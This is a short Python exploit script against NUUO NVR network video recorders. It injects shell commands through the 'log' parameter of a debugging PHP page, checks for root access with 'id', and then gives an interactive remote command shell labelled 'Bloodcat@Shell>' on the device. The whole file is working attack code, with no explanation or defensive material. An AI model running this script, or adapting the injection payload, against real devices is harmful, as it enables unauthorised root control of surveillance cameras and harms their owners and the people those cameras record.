#!/usr/bin/env python3
 
import requests
import re

class Exploit:
    def run(
        self,
        url
    ):
        e = NUUO()
        e.exp(url)


class NUUO():
    
    def exp(self, url):
        LOGO = '''==============WIN================'''
        self.Payload = r'/__debugging_center_utils___.php?log=;echo%20{{rand}}%20|%20'
        url = url.rstrip('/')
        if self.detect(url):
            print(LOGO)
            print(f"[+] {url}")
            while True:
                cmd = input("Bloodcat@Shell>")
                if cmd == 'exit':
                    return
                res = requests.get(url+self.Payload+cmd)
                pattern = re.compile(r"<pre>([\s\S]*?)</pre>", re.IGNORECASE)
                matches = pattern.findall(res.text)
                cleaned_results = []
                for block in matches:
                    cleaned = re.sub(r"^.*;echo.*$\n?", "", block, flags=re.MULTILINE)
                    cleaned_results.append(cleaned.strip())
                for result in cleaned_results:
                    print(result)

    def detect(self, url):
        cmd = 'id'
        res = requests.get(url + self.Payload + cmd, verify=False)
        if 'root' in res.text:
            print("[+] NUUO NVR camera has vulnerable...")
            return 1
        else:
            print("[-] Target not vulnerable.")
            return 0

 